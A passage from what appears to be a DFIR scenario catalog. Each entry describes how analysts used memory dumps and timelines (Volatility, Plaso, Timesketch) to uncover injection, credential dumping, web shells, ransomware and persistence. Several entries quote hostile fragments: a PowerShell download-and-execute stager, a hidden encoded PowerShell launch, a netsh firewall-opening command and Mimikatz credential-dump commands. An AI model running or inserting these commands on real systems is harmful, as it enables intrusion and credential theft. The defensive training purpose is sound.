- **Solution**: PEStudio + DumpIt + PS artifact
- **Tags**: #cliphijack #memorypowershell #encodedcommand

## Disk + RAM Reveals Remote Thread Injection from Obfuscated PE

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Thread injection via memory PE blob
- **MITRE**: T1055.001, T1204
- **Impact**: Named pipe → decode PE → thread inject
- **Tools**: FTK Imager, Volatility, x64dbg
- **Scenario**: Remote thread created from fileless PE
- **Attack Steps**: High CPU on non-admin user account leads to RAM + disk forensics. FTK confirms no new binaries in AppData. Volatility psscan shows thread injection from explorer.exe to another user’s notepad.exe. RWX memory mapped block traced. Dumped via procdump, x64dbg shows shellcode stub decoding large PE image in memory. No on-disk persistence, only injected from memory blob stored in a named pipe. Signature created for pipe name and RWX memory hash.
- **Detection**: RAM + PE analysis + named pipe
- **Solution**: x64dbg + Volatility thread trace
- **Tags**: #remotethread #filelessinject #namedpipeabuse

## RAM Scan Reveals Mimikatz Running from Obfuscated Memory Segment

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Mimikatz in-memory obfuscation
- **MITRE**: T1003.001
- **Impact**: Memory-only Mimikatz in renamed process
- **Tools**: Magnet RAM Capture, Volatility, PEStudio
- **Scenario**: Attacker runs Mimikatz from unpacked memory blob
- **Attack Steps**: Suspicious memory access to LSASS triggered RAM capture. Volatility malfind, handles, and cmdline show obfuscated process svhoste.exe running in user temp directory. Memory region dumped, PEStudio deobfuscates binary and recognizes Mimikatz function exports (sekurlsa::logonpasswords, privilege::debug). No executable on disk. API calls to ReadProcessMemory and token privileges indicate credential theft. IOC generated from memory hash + process name pattern.
- **Detection**: RAM dump + PEStudio export match
- **Solution**: Magnet + Volatility + API hooks
- **Tags**: #mimikatz #memobfuscation #ramtools

## Disk Imaging Uncovers Dropper That Loads DLLs via MS Office Add-Ins

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Excel XLL Add-In for memory DLL load
- **MITRE**: T1137.006, T1218.011
- **Impact**: Office add-in → RAM shellcode DLL
- **Tools**: FTK Imager, Autoruns, Volatility
- **Scenario**: Office add-ins abused to side-load DLL into memory
- **Attack Steps**: FTK forensic image reveals suspicious .xll add-in loaded on Excel startup. DLL path points to user folder C:\Users\...\Addins\. Volatility memory analysis shows Excel process with injected memory matching obfuscated shellcode structure. Autoruns confirms add-in persistence. Memory dump reviewed and PE validated—beacon logic includes HTTP C2 and credential harvesting. IOC includes Office path + hash of DLL + memory shellcode structure.
- **Detection**: Disk + Autoruns + Volatility PE
- **Solution**: Add-In audit + memory inspection
- **Tags**: #officedll #addinabuse #excelinject

## RAM Image Captures Credential Theft via Manual Token Duplication

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: SYSTEM token theft via memory tool
- **MITRE**: T1134.001
- **Impact**: Token duplication tool → memory-only logic
- **Tools**: Volatility, x64dbg, Belkasoft
- **Scenario**: Attacker duplicates SYSTEM token in-memory
- **Attack Steps**: Suspicious privilege elevation detected. RAM analyzed with Volatility handles, privs, and cmdline. Custom tool tokensteal.exe visible only in memory creates SYSTEM token using DuplicateTokenEx. x64dbg walks the memory logic and finds embedded privilege escalation code including OpenProcessToken, AdjustTokenPrivileges. Belkasoft strings highlight internal name “TokenMonster”. IOC built from in-memory tool signature and token privilege sequence.
- **Detection**: Volatility + token trace + x64dbg
- **Solution**: Privilege sequence detection
- **Tags**: #tokenduplication #inmemoryescalation #syssteal

## RAM Analysis Reveals Encoded Reverse Shell Initiated from Environment Variable

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Reverse shell via env var payload
- **MITRE**: T1059.001, T1204
- **Impact**: Env var → decoded PS → nc shell
- **Tools**: Rekall, Volatility, PEStudio
- **Scenario**: Reverse shell triggered from env var script decoded in memory
- **Attack Steps**: Host beaconing to unusual IP. RAM capture via Rekall. Volatility cmdline and malfind identify PowerShell decoding logic referencing environment variable MY_CONFIG. Dumped memory shows string encoded base64 blob invoking nc.exe to open shell on port 9001. PEStudio validates shell binary and confirms modified PATH variable entry. Detection based on env var usage + shell trigger. IOC includes encoded blob, env var reference, and remote port pattern.
- **Detection**: RAM scan + env var decode
- **Solution**: Rekall + PS + PEStudio
- **Tags**: #envvarabuse #psreverse #ncconnect

## Memory Dump Shows Shared Memory Region Used for IPC Between Malicious Processes

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Memory-based IPC for malware sync
- **MITRE**: T1021.002, T1055
- **Impact**: Shared memory → no network → data sync
- **Tools**: DumpIt, Volatility, Process Hacker
- **Scenario**: Two malicious processes communicate via shared memory
- **Attack Steps**: Suspicious processes show unusual IPC. Memory dump with DumpIt. Volatility memmap, vadinfo show shared memory region mapped to both updater.exe and client.exe. Strings show encryption handshake and data transfer. Process Hacker confirms shared memory section handle. No network activity used; instead, processes sync via memory. Dumped contents include token values, configuration strings, and mutex pattern SHMEM_CONN. IOC created to scan for shared section abuse.
- **Detection**: Memory + handle + mutex trace
- **Solution**: DumpIt + Volatility + strings
- **Tags**: #sharedmemory #ipcabuse #ramchannels

## Browser History Timeline Exposes Staged Payload Download via Dropbox

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Initial access via hosted payload
- **MITRE**: T1105
- **Impact**: Public file-sharing misuse
- **Tools**: Plaso, Timesketch, Event Log Explorer
- **Scenario**: Adversary used public Dropbox link to stage payload pre-compromise
- **Attack Steps**: Analyst receives IOC of Dropbox URL used in previous phishing wave. Plaso used to extract all Chrome history from affected host using log2timeline.py which parses History SQLite DB, including URL visits, visit_count, last_visit_time, and transition type. Timeline built with Timesketch overlays Chrome history with Windows Event Logs. Entry shows user visited Dropbox link at 08:11 AM, followed by download event at 08:12 AM. Prefetch file of payload.exe indicates execution shortly after. File hash correlated with known RAT. Incident responded with full user quarantine, Dropbox domain added to blocklist, and user re-education.
- **Detection**: Chrome DB + timeline sync
- **Solution**: Plaso browser + Event sync
- **Tags**: #dropboxrat #browserrecon #initialaccess

## Prefetch + MFT Timeline Shows Execution of Renamed Malware Binary

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Masquerading malware + task persistence
- **MITRE**: T1036, T1053
- **Impact**: Fake binary runs + persists
- **Tools**: Plaso, Timesketch, FTK Imager
- **Scenario**: Malware renamed to mimic notepad.exe, executed from unusual path
- **Attack Steps**: Host exhibiting beaconing to unapproved IP. FTK image pulled and log2timeline.py used to extract timeline from MFT, Prefetch, Registry, USN Journal. Analysis in Timesketch reveals renamed notepad.exe executed from C:\Users\Public\Files\. Prefetch shows actual EXE name was notepade.exe, last run timestamp 6:41 PM. Timeline also shows creation of scheduled task within 10 seconds, along with corresponding Registry key addition. Correlation confirms execution + persistence in one flow. System isolated, IOC generated from path + timeline signature.
- **Detection**: Prefetch + MFT timeline
- **Solution**: Plaso + Prefetch + Registry
- **Tags**: #masquerade #timelinerule #persistence

## Event Logs and Timeline Correlate RDP Brute Force Before Access Grant

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: RDP brute force timeline
- **MITRE**: T1110.001
- **Impact**: Password spray → RDP login
- **Tools**: Plaso, Timesketch, Security.evtx
- **Scenario**: Repeated failed logins followed by successful RDP session accepted
- **Attack Steps**: Brute-force alerts from SIEM. Event logs collected and parsed into Plaso. log2timeline.py processes Security.evtx, extracting all 4625 (logon failure) and 4624 (logon success) events. Timesketch overlay shows hundreds of 4625s over 20 minutes from same IP, followed by one 4624 at 3:14 PM. Timeline also shows TerminalServicesLocalSessionManager and RDPUI DLL loading right after 4624. Analyst confirms password spraying success. SOC blocks IP, resets affected account credentials, and adds 2FA policy to RDP access group.
- **Detection**: Event + DLL + logon correlation
- **Solution**: EventCode overlay
- **Tags**: #rdpbrute #eventtimeline #logonabuse

## File System + Shellbags Timeline Shows Lateral Movement via Mounted Share

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Lateral move via file share
- **MITRE**: T1021.002
- **Impact**: SMB mapped → PsExec execution
- **Tools**: Plaso, Timesketch, ShellBags Explorer
- **Scenario**: Attacker mapped network share and executed tool from remote path
- **Attack Steps**: Suspicious lateral movement detected. Timeline created from shellbags, MFT, and Registry with Plaso. Timesketch shows drive Z:\ mapped to \\HR-FILES\Tools\. Shellbags timestamp indicates GUI access at 1:03 PM. MFT log confirms execution of PsExec.exe from mapped drive within one minute. Security.evtx shows creation of service remotely. Movement traced across timeline, user credentials used during access. SOC alerts created for remote drive execution behavior, user account under review.
- **Detection**: Shellbags + share + MFT
- **Solution**: Timeline + service create
- **Tags**: #psexec #networkshare #shellbags

## Timeline Shows ZIP Extraction → EXE Execution → Registry Write

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Classic ZIP malware chain
- **MITRE**: T1204.002, T1547.001
- **Impact**: Archive→execute→persist
- **Tools**: Plaso, Timesketch, Email Logs
- **Scenario**: Malicious ZIP delivered via email leads to trojan execution
- **Attack Steps**: Email analysis shows user received ZIP attachment. Timeline built from user’s NTFS logs and Registry shows invoice.zip downloaded at 10:16 AM, extracted to Downloads. setup.exe launched 10:17 AM. Registry key HKCU\Software\Microsoft\Windows\Run\updateSvc added at 10:18. No other file interaction. Timeline flow clearly depicts extraction → execution → persistence. IOC built based on ZIP-EXE-write sequence and hash. System reimaged.
- **Detection**: File ops + reg keys
- **Solution**: Email header + MFT correlation
- **Tags**: #ziploader #timelinesequence #dropchain

## Timeline Maps Registry Activity to New Chrome Extension Injecting Ads

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Extension abuse → ad injection
- **MITRE**: T1176
- **Impact**: Timeline confirms forced extension
- **Tools**: Plaso, Timesketch, Chrome Forensics
- **Scenario**: Unauthorized Chrome extension added to user profile
- **Attack Steps**: Ads appearing in web sessions. Timeline extracted using Plaso from Registry hives and Chrome Extension folders. Event shows Chrome extension advboost@xyz installed 11:45 AM in AppData\Local\Google\Chrome\User Data\Default\Extensions. Registry timeline reveals update to Chrome policies under HKCU\Policies\Google\Chrome\ExtensionInstallForceList. Extension’s JS code injects ad overlays. Timeline helps prove unapproved policy install. Admin revokes GPO push and removes rogue plugin.
- **Detection**: Reg key + folder match
- **Solution**: Chrome policy + JS review
- **Tags**: #browsertimeline #extensionabuse #adware

## Timeline Correlates USB Insertion with Launch of Malicious Script

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: USB AutoRun → lateral move
- **MITRE**: T1200, T1059.003
- **Impact**: USB→autorun→bat→rdp
- **Tools**: Plaso, Timesketch, USBDeview
- **Scenario**: Script executed automatically after USB plug-in
- **Attack Steps**: Suspicion of malicious insider USB activity. Plaso parses Windows setupapi.dev.log, Registry USB entries, and event logs. Timesketch shows USB drive inserted 2:11 PM, AutoRun enabled, and .bat script connectinfo.bat executed 2:12 PM. Shell command history also shows immediate opening of RDP client using IP passed in script. Analyst confirms lateral movement attempt via USB. Device banned via GUID, user flagged for HR review.
- **Detection**: Device log + script decode
- **Solution**: SetupAPI + bat correlation
- **Tags**: #usbautorun #malicioususb #timerecon

## Multi-User Timeline Shows Remote File Access Before Sensitive Doc Leak

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Insider access + external upload
- **MITRE**: T1537
- **Impact**: File → copy → zip → exfil
- **Tools**: Plaso, Timesketch, File Access Logs
- **Scenario**: User accessed restricted folder before data appeared online
- **Attack Steps**: Security team investigates leaked internal docs. Plaso timeline aggregates user session logs, file access timestamps, and network activity. Timesketch shows confidential_budget.xlsx accessed by user jane.doe on D:\Finance\ at 4:09 PM. Timeline shows file copied to Downloads\ and zipped 4:10 PM. Browser shows anonfiles.com visited 4:12 PM, matching leak time. SOC confirms user involvement, HR notified, DLP controls enforced.
- **Detection**: File log + browser + timing
- **Solution**: Access audit + URL hit
- **Tags**: #insiderleak #filetimeline #browserleak

## Timeline Proves Sandbox Evasion by Comparing System Sleep Events

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Time delay evasion
- **MITRE**: T1497.001
- **Impact**: Sleep before action
- **Tools**: Plaso, Timesketch, System Logs
- **Scenario**: Malware stalls for 15 mins to evade analysis
- **Attack Steps**: Sample observed delaying action post-execution. Plaso used to correlate Prefetch, System event logs, and MFT. Timeline in Timesketch reveals loader.exe ran at 9:00 AM but no activity from 9:01–9:15. malicious.dll only loads at 9:16 AM. Sleep state inferred by examining thread activity gap and TimerQueue creation in logs. Proves sandbox evasion via sleep loop. Analyst builds detection for time gaps post-binary load.
- **Detection**: Prefetch + event logs
- **Solution**: Delay gap in timeline
- **Tags**: #sandboxbypass #delayload #timelinegap

## Timeline Confirms Chrome Plugin Used for OAuth Token Theft

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: OAuth token via rogue plugin
- **MITRE**: T1528
- **Impact**: Plugin→token→exfil
- **Tools**: Plaso, Timesketch, OAuth Logs
- **Scenario**: OAuth token stolen via extension mimicking productivity tool
- **Attack Steps**: Suspicious login to corporate Google account from offshore IP. Plaso timeline combines Chrome Extension data, Registry, and network logs. Shows install of docconverter extension at 10:15 AM, which exfiltrated Google token at 10:16 via HTTPS POST. JS code had token parser for Chrome storage. Extension never whitelisted. Incident confirms token theft by plugin. SOC blacklists hash, warns affected users.
- **Detection**: Chrome storage timeline
- **Solution**: JS code + net flow + plugin match
- **Tags**: #tokensteal #oauthplugin #webattack

## Timeline Tracks Ransomware Encryption Wave from Dropped Executable

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Ransomware execution + encryption
- **MITRE**: T1486
- **Impact**: Dropped binary → mass file rename
- **Tools**: Plaso, Timesketch, FTK Imager
- **Scenario**: Crypto-ransomware triggered via payload dropped in AppData
- **Attack Steps**: A critical host is suspected of ransomware infection. Disk image acquired using FTK Imager and processed using log2timeline.py. Plaso extracts all file creation, renaming, and deletion metadata from NTFS MFT, USN journal, and LNK files. Timesketch analysis reveals invoice_reader.exe dropped in AppData\Roaming\Temp\ at 6:11 PM. File execution traced through Prefetch and shortcut file timestamps. Within 15 seconds, multiple user documents across Desktop, Documents, and Pictures directories show modified and renamed attributes to .locked extension. Timeline shows rapid MFT rename, then Registry entries indicating wallpaper change and RDP disabled via policy. Plaso plugin extracts ransomware note creation under C:\Users\Public\ReadMe.txt. SOC confirms crypto action. System is isolated, backups triggered, note hash and dropper path added to IOC list.
- **Detection**: MFT + Prefetch + registry overlay
- **Solution**: FTK + Plaso + Timesketch
- **Tags**: #ransomwaretimeline #plasoencryption #filechange

## Email Delivery to Execution Chain Rebuilt Using Timeline Metadata

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Phishing to file-based malware
- **MITRE**: T1204.002, T1547.001
- **Impact**: Email → ZIP → EXE → registry
- **Tools**: Plaso, Timesketch, Email Headers
- **Scenario**: Phishing email delivers ZIP → runs EXE → modifies registry
- **Attack Steps**: A user-reported phishing email triggers investigation. Email headers show ZIP attachment claim_details.zip. Using log2timeline.py, analyst creates timeline including user download folders, registry writes, and application execution. Timeline reveals claim_details.zip saved at 10:22 AM, extracted 10:23, followed by execution of details_viewer.exe from %TEMP%. Registry key created under HKCU\Software\Microsoft\Windows\Run\initkey at 10:25 pointing to EXE. Prefetch confirms it ran multiple times. File hash analysis shows EXE linked to Emotet variant. Timeline proves infection path from email to persistence. Email domain and file hash blocked.
- **Detection**: Timeline + Registry + Prefetch
- **Solution**: Plaso + email chain
- **Tags**: #emailchain #phishingexe #timelineattack

## Browser + DNS + Shell Timeline Uncovers Web Shell Deployment via PHP File

- **Attack Type**: Timeline Analysis
- **Target**: Linux
- **Vulnerability**: Web shell drop + execution
- **MITRE**: T1505.003
- **Impact**: PHP file upload → browser trigger → shell
- **Tools**: Plaso, Timesketch, DNS Logs
- **Scenario**: PHP web shell uploaded and triggered via browser
- **Attack Steps**: Web server shows suspicious outbound traffic. Plaso timeline generated using server access logs, command history, and MFT. Timesketch reveals attacker uploaded shell.php via file upload page at 01:32 PM. At 01:33, attacker browses to /uploads/shell.php. Shell command history (.bash_history) shows immediate execution of whoami, uname -a, and netstat. DNS logs confirm outbound request to C2 domain at 01:34. IOC built from URL path, shell signature, and file system metadata. Web shell cleaned and WAF rule updated.
- **Detection**: Apache log + DNS + bash history
- **Solution**: Web + shell timeline overlay
- **Tags**: #webshelltimeline #phpdrop #serveraccess

## File Timestamp + Registry Correlation Shows Side-Loaded DLL

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: DLL sideload via trusted binary
- **MITRE**: T1574.002
- **Impact**: EXE + DLL drop → run + persist
- **Tools**: Plaso, Timesketch, Autoruns
- **Scenario**: DLL side-loaded by trusted binary from same folder
- **Attack Steps**: SOC suspects persistence via DLL sideload. Timeline generated from full FTK image with Plaso parsing file system and Registry. Timeline identifies binary mscalc.exe dropped 7:09 AM in C:\ProgramData\Calc\. Followed by DLL d3dx9_43.dll added at 7:10 AM. Execution logged by Prefetch at 7:12 AM. Registry key under HKCU\Software\Microsoft\Windows\Run\calcstart points to mscalc.exe. Timesketch shows DLL sideload timeline matches execution and persistence. DLL hash confirmed as Cobalt Strike beacon. IOC added to detection.
- **Detection**: File time + registry path
- **Solution**: DLL + PE correlation
- **Tags**: #sideloadtimeline #trustedbinaryabuse #cobaltbeacon

## Suspicious Service Creation Tracked Using Service Log + Timeline

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Service persistence via custom EXE
- **MITRE**: T1543.003
- **Impact**: Service install → EXE persist
- **Tools**: Plaso, Timesketch, Event Log Explorer
- **Scenario**: Malware installs service to run payload at boot
- **Attack Steps**: Host flagged for persistence behavior. Timeline created using Plaso to parse Registry, System.evtx, and MFT. At 11:47 AM, service SysWinHelper registered via HKLM\SYSTEM\CurrentControlSet\Services\. Timeline overlays show helperhost.exe written to C:\Windows\System32\Helper\. Service start timestamp matches EXE execution in Prefetch. Event ID 7045 confirms service install. Timesketch shows correlation between EXE creation, service registry write, and event log in under 1 minute. IOC created for service name and binary hash. Defender policy updated.
- **Detection**: Reg key + event log
- **Solution**: Timeline + Prefetch sync
- **Tags**: #servicecreate #event7045 #persistencedetect

## Jump List + Shellbags Timeline Shows Execution of Remote RAR SFX

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: SFX auto-execution via share access
- **MITRE**: T1204.003, T1547.001
- **Impact**: Remote RAR → extract+run → persist
- **Tools**: Plaso, Timesketch, JumpList Explorer
- **Scenario**: Remote SFX archive triggers malware when opened
- **Attack Steps**: Malicious behavior observed after user accessed shared folder. Plaso parses NTUSER.DAT and jump list LNK files. Timeline shows access to \\Marketing\Campaigns\promo_sfx.rar at 2:13 PM. JumpList reveals user launched promo_sfx.rar directly. RAR SFX extracts files and launches promoViewer.exe, tracked in MFT. Registry key RunOnce created by payload to persist across reboots. Timesketch timeline reconstructs user click to execution to registry write in <2 minutes. IOC based on SFX path and EXE hash.
- **Detection**: Shellbags + MFT + JumpList
- **Solution**: Shared path + JumpList entry
- **Tags**: #sfxabuse #remoteexec #timelineclick

## Timeline Maps Credential Dump to SamDump Execution Triggered via Script

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Credential dumping via custom script
- **MITRE**: T1003.002
- **Impact**: bat→exe→SAM→dump
- **Tools**: Plaso, Timesketch, Script Decoder
- **Scenario**: SamDump.exe executed via custom batch file dropped by attacker
- **Attack Steps**: AD domain controller shows spike in traffic. Timeline built with Plaso from file access logs and Registry. Timesketch reveals getsam.bat dropped in C:\Temp\ at 4:23 PM, executes SamDump.exe at 4:24 PM. Registry event shows user disabled Defender prior to execution. Sam file accessed and dumped to dump.txt. Timeline proves coordinated batch + binary drop and execution. SOC resets credentials, begins audit.
- **Detection**: File drop + registry + file open
- **Solution**: Timeline + content decode
- **Tags**: #samscript #batchattack #dumpsam

## Timeline Rebuild Shows USB Payload Used for Password Dump

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Physical USB + credential dump
- **MITRE**: T1056.001, T1555
- **Impact**: HID inject → EXE run → browser creds
- **Tools**: Plaso, Timesketch, USB Logs
- **Scenario**: Rubber Ducky drops payload to extract browser credentials
- **Attack Steps**: Host suspected of physical attack. Plaso parses SetupAPI.dev.log, Registry, and USB artifacts. Timesketch reveals HID device injected at 8:04 AM. At 8:05, EXE creds_stealer.exe dropped to %TEMP% and launched. Extracted Chrome credentials using SQLite API calls. File creds.txt created 8:06 AM. Timeline maps exact drop to dump. USB GUID blacklisted. Device traced back to known insider threat.
- **Detection**: USB + file create + timeline
- **Solution**: Plaso + HID device decode
- **Tags**: #usbcredsteal #timelineusb #physicalattack

## Timeline Reveals PowerShell Stager Dropped via Login Script

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: GPO login script → PS stager
- **MITRE**: T1059.001, T1204.002
- **Impact**: VB → PS → beacon
- **Tools**: Plaso, Timesketch, GPO Logs
- **Scenario**: PowerShell stager executes via GPO login script
- **Attack Steps**: Workstations show PS beacon activity. Plaso parses user logon logs and script execution. Timeline shows GPO logon script logon_helper.vbs executed at 9:10 AM. File drops stage.ps1 in AppData, triggers hidden PowerShell process. log2timeline.py captures script write, process start, and net connection. Beacon traffic captured 9:11 AM. IOC built from script hash and drop path. Group policy revoked.
- **Detection**: Logon + file drop + net flow
- **Solution**: GPO + PS + file metadata
- **Tags**: #gpobeacon #timelineps #startupscript

## Timeline Maps Obfuscated JavaScript Exploit from Malicious Site Visit

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: JS browser exploit → DLL persist
- **MITRE**: T1189, T1218.011
- **Impact**: site→script→DLL→persist
- **Tools**: Plaso, Timesketch, Proxy Logs
- **Scenario**: JS exploit delivered from compromised news website
- **Attack Steps**: Plaso parses browser history and cache. User visits worldnewsdaily.com at 11:02 AM. JavaScript exploit detected in cache at 11:03 AM (exploit.js) obfuscated and dynamically loads second-stage via eval(). Timesketch shows DLL dropped to %APPDATA%, execution via rundll32. Registry key for persistence added at 11:04. Timeline shows site visit → script → DLL → reg entry in 2 minutes. IOC created from JS signature and DLL hash. WAF rule added.
- **Detection**: Browser cache + Registry
- **Solution**: JS + DLL + Rundll trace
- **Tags**: #jsloader #browsersploit #regpersist

## Timeline Reveals Hidden Remote Desktop Activation via Registry and Scheduled Task

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Registry & Task-based RDP enable
- **MITRE**: T1021.001, T1053.005
- **Impact**: reg → schtasks → firewall → RDP
- **Tools**: Plaso, Timesketch, Registry Explorer, FTK Imager
- **Scenario**: Attacker silently enables RDP via registry edit and scheduled script
- **Attack Steps**: Full disk image of compromised workstation is acquired using FTK Imager and parsed through Plaso for Registry and Task Scheduler changes. Timeline analysis in Timesketch shows that at 03:42 AM, regedit.exe modifies HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections to 0, enabling Remote Desktop. Just 30 seconds later, a scheduled task named WinUpdateTrigger is created via schtasks.exe, which triggers netsh firewall set service remoteadmin enable. MFT metadata shows task creation file timestamps matching registry alteration. Prefetch confirms execution of netsh.exe. Network logs overlay this activity, revealing successful inbound RDP connection 10 minutes later. This entire chain of persistence, privilege misuse, and remote access gets reconstructed with exact timing through the timeline, enabling rapid threat isolation. IOC generated from the registry path and scheduled task name. SOC disables suspicious RDP rule and resets affected credentials.
- **Detection**: Registry + task scheduler
- **Solution**: Plaso timeline + event overlay
- **Tags**: #rdptimeline #remoteaccess #registrybypass

## Timeline Dissects GPO Abuse to Deploy PowerShell Beacon on Multiple Hosts

- **Attack Type**: Timeline Analysis
- **Target**: Windows (Enterprise)
- **Vulnerability**: GPO abuse → PS stager
- **MITRE**: T1059.001, T1204.002
- **Impact**: GPO → login → script → beacon
- **Tools**: Plaso, Timesketch, GPO Event Logs
- **Scenario**: Adversary uses GPO logon script to distribute stager via network
- **Attack Steps**: Domain controller is suspected of beacon activity. Analyst parses image with Plaso and overlays GPO change logs, Registry writes, and file system activity. Timesketch reveals that on 9:14 AM, a logon script logon_beacon.ps1 is pushed via GPO to \\domain\sysvol\scripts\. Script content (decoded from PowerShell event 4104 logs) runs a stager: IEX (New-Object Net.WebClient).DownloadString(...). Timeline shows the script write in SYSVOL, replication to multiple hosts' registry via login, followed by multiple hidden PowerShell execution events around 9:16–9:18 AM. Beacon connects to remote IP via HTTPS. Timeline visualization reveals exact attacker deployment sequence across infrastructure using only native Windows mechanisms. SOC revokes GPO, kills beacon sessions, and performs widespread IOC sweep.
- **Detection**: GPO + PS + Registry
- **Solution**: Event logs + timeline trace
- **Tags**: #gpobeacon #logonscript #powershelltimeline

## Timeline Tracks Registry Key Used to Inject Malicious Shellcode via Rundll32

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Shellcode via Registry abuse
- **MITRE**: T1112, T1218.011
- **Impact**: reg key → rundll32 → shellcode
- **Tools**: Plaso, Timesketch, Registry Explorer, YARA
- **Scenario**: Registry used to store shellcode executed by legitimate process
- **Attack Steps**: Suspicious Rundll32 behavior identified. Plaso parses full image and focuses on Registry hives and Prefetch artifacts. Timeline shows at 10:18 AM, attacker uses reg.exe to insert Base64-encoded shellcode into HKCU\Software\Classes\ms-settings\Shell\Open\command. At 10:20, rundll32.exe is launched with CLSID argument that reads the malicious key. Plaso extracts this command and overlays with Prefetch and Execution logs. Timeline reveals the entire weaponization of Registry as in-memory loader. Analyst runs YARA against memory dumps and confirms shellcode beacon. IOC derived from key path and rundll32 pattern. System isolated and memory image preserved.
- **Detection**: Registry + Rundll32 + Memory
- **Solution**: Registry timeline + exe overlay
- **Tags**: #rundllregistry #shellcodetimeline #meminject

## Timeline Shows Chrome Exploit Delivered via Malicious Extension Sync

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Extension sync exploit
- **MITRE**: T1176, T1556.003
- **Impact**: Google sync → inject ext → steal data
- **Tools**: Plaso, Timesketch, Chrome Sync Logs
- **Scenario**: Compromised Google account syncs backdoor extension to host
- **Attack Steps**: User reports unusual Chrome behavior. Plaso parses browser cache, Registry, file creation metadata. Timesketch reveals ExtensionInstallForcelist registry key created at 12:47 PM. Simultaneously, folder under Chrome Extensions path created with ID matching known backdoor extension. MFT shows files added including background.js, manifest.json. Timeline matches registry key write to profile sync timestamp. The JS injects form grabbers and opens hidden tab to attacker’s server. Timeline helps prove that Chrome sync feature pulled malicious extension via compromised Google account. SOC disables sync, resets account, blocks extension ID.
- **Detection**: Chrome + Registry
- **Solution**: Timeline of sync and keylog script
- **Tags**: #chromeextension #syncattack #forcelistinject

## File System Timeline Exposes Python Reverse Shell Hidden in System32

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Reverse shell via renamed Python EXE
- **MITRE**: T1059.006
- **Impact**: drop EXE → System32 → run silently
- **Tools**: Plaso, Timesketch, Event Viewer
- **Scenario**: Malicious Python script renamed to EXE placed in System32
- **Attack Steps**: Random beacon from critical host. Timeline created by parsing System32 folder metadata. Plaso shows that netutility.exe was added to C:\Windows\System32\ at 2:34 PM, though not matching any verified binary hash. Execution confirmed via Prefetch. Script extracted, reveals Python embedded reverse shell code compiled to EXE. Timeline confirms file drop, permission change, and execution chain. Registry shows no obvious persistence, suggesting dropper was remote-initiated. Timeline proves stealthy upload and activation path. Binary hash flagged, system reimaged.
- **Detection**: File drop + prefetch + script parse
- **Solution**: Timeline of drop and execution
- **Tags**: #pyreverse #exeobfuscation #timelineutil

## Timeline Maps Initial Access via Exploit Kit to Final Meterpreter Session

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Exploit kit → shellcode → Meterpreter
- **MITRE**: T1189, T1203
- **Impact**: web→script→exploit→shell
- **Tools**: Plaso, Timesketch, Browser Forensics
- **Scenario**: User visits malicious link triggering exploit kit payload
- **Attack Steps**: Host crash follows suspicious browsing. Plaso parses browser cache, downloaded files, memory dump. Timeline shows user visited offersplus24.com at 4:12 PM. Script load.js auto-executes, redirects user to exploit kit site. Shellcode deployed into browser memory via use-after-free vuln. Within 30s, MFT shows new file payload.exe written and executed silently. Memory dump indicates Meterpreter session. Timeline links each file and network event. SOC shuts down host, updates filters, and logs browser history pattern for IOC.
- **Detection**: Browser + memory timeline
- **Solution**: Timeline from click to callback
- **Tags**: #exploitkit #timelineweb #meterpretermap

## Log Timeline Exposes RAT Delivered via LNK File with Embedded PowerShell

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: LNK shortcut → PS → RAT
- **MITRE**: T1204.002, T1059.001
- **Impact**: LNK drop → PS decode → beacon
- **Tools**: Plaso, Timesketch, LNK Parser
- **Scenario**: LNK file containing obfuscated PowerShell spawns RAT
- **Attack Steps**: Suspicious outbound traffic detected. Timeline parsed from user Downloads. Plaso reveals invoice.lnk downloaded and opened at 10:04 AM. LNK contains powershell -nop -w hidden -enc ... payload that downloads and executes agent.exe. Timeline matches exact creation and launch of LNK, with Prefetch confirming execution. MFT logs agent write at 10:05. Within seconds, network logs show C2 traffic. Timeline overlays LNK metadata, PS execution, and beacon. IOC generated from LNK structure and EXE hash.
- **Detection**: LNK + PowerShell logs + netflow
- **Solution**: Timeline of shortcut behavior
- **Tags**: #lnkratexploit #timelineps #shortcutabuse

## Scheduled Task + EXE Timeline Proves Crypto-Miner Persistence

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Crypto-miner task persistence
- **MITRE**: T1053.005
- **Impact**: EXE drop → schtask → persist mine
- **Tools**: Plaso, Timesketch, Task Logs
- **Scenario**: Dropper creates task to persist miner payload
